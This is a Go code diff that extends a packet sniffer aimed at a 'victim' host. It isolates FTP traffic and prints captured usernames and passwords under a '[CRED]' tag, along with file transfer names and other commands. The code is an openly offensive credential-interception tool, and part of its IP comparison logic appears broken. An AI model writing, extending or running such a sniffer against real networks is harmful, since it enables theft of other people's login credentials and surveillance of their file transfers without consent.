@@ -16,6 +16,12 @@ var (
 	snaplen int32 = 1024
 	promisc bool  = false
 	timeout time.Duration = pcap.BlockForever
+
+	/* prettify */
+	red   = "\033[31m"
+	cyan  = "\033[36m"
+	green = "\033[32m"
+	fn    = "\033[0m"
 )
 
 /* 
@@ -42,32 +48,43 @@ func selectInterface() (pcap.Interface, error) {
  */
 
 func parseCaughtPacket(packet gopacket.Packet) {
-	ipv6 := packet.Layer(layers.LayerTypeIPv6)
-	if ipv6 != nil {
+	linkLayer := packet.LinkLayer()
+	ipLayer := packet.Layer(layers.LayerTypeIPv4)
+	tcpLayer := packet.Layer(layers.LayerTypeTCP)
+	
+	if linkLayer == nil || ipLayer == nil || tcpLayer == nil {
+		fmt.Println("[ NULL ] Caught malformed packet")
 		return
 	}
-	transportLayer := packet.Layer(layers.LayerTypeTCP)
 	
-	if transportLayer != nil {
-		tcp, _ := transportLayer.(*layers.TCP)
-		appLayer := packet.ApplicationLayer()
-		linkLayer := packet.LinkLayer()
+	ip, _ := ipLayer.(*layers.IPv4)
+	tcp, _ := tcpLayer.(*layers.TCP)
+	appLayer := packet.ApplicationLayer()
 
-		if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) && 
-			linkLayer.LinkFlow().Src().String() == os.Args[2] {
-			payload := strings.Split(string(appLayer.Payload()), " ")
-			
+	if appLayer != nil && (tcp.SrcPort == 21 || tcp.DstPort == 21) && 
+		linkLayer.LinkFlow().Src().String() == os.Args[2] {
+		payload := strings.Split(string(appLayer.Payload()), " ")
+		
+		fmt.Printf("[DEBUG] %s\n", string(ip.SrcIP))
+		if string(ip.SrcIP) == os.Args[5] {
+			/* Server --> client traffic */
+			fmt.Printf("[PLACEHOLDER] caught server traffic")
+		} else {
+			/* Client --> server traffic */
 			switch payload[0] {
 			case "USER":
-				fmt.Printf("[USER] Caught credentials: username %s", payload[1])
+				fmt.Print(red,"[CRED]",fn," Caught credentials: username ",payload[1])
 			case "PASS":
-				fmt.Printf("[PASS] Caught credentials: password %s", payload[1])
+				fmt.Print(red,"[CRED]",fn," Caught credentials: password ",payload[1])
 			case "RETR":
-				fmt.Printf("Client <--- Server: %s", payload[1])
+				fmt.Print(green,"[FILE TRANSFER]",fn," Client <--- Server: ",payload[1])
 			case "STOR":
-				fmt.Printf("Client ---> Server: %s", payload[1])
+				fmt.Print(green,"[FILE TRANSFER]",fn," Client ---> Server: ",payload[1])
 			default:
-				break
+				fmt.Print(cyan,"[",payload[0],"]",fn)
+				if len(payload) > 1 {
+					fmt.Printf(" payload: %s\n", strings.Join(payload[1:], " "))
+				}
 			}
 		}
 	}
@@ -79,7 +96,7 @@ func parseCaughtPacket(packet gopacket.Packet) {
  */
 
 func Sniffer(victimIP string) {
-	filter := "host " + os.Args[3]
+	filter := "not ipv6 and tcp and host " + os.Args[3]
 	iface, err := selectInterface()
 	
 	if err != nil {
@@ -99,7 +116,7 @@ func Sniffer(victimIP string) {
 	}
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	
-	fmt.Println("[ MONITORING NETWORK ]")
+	fmt.Printf("📡 [ MONITORING NETWORK FOR IP %s ] 📡\n", os.Args[3])
 	for packet := range packetSource.Packets() {
 		parseCaughtPacket(packet)
 	}
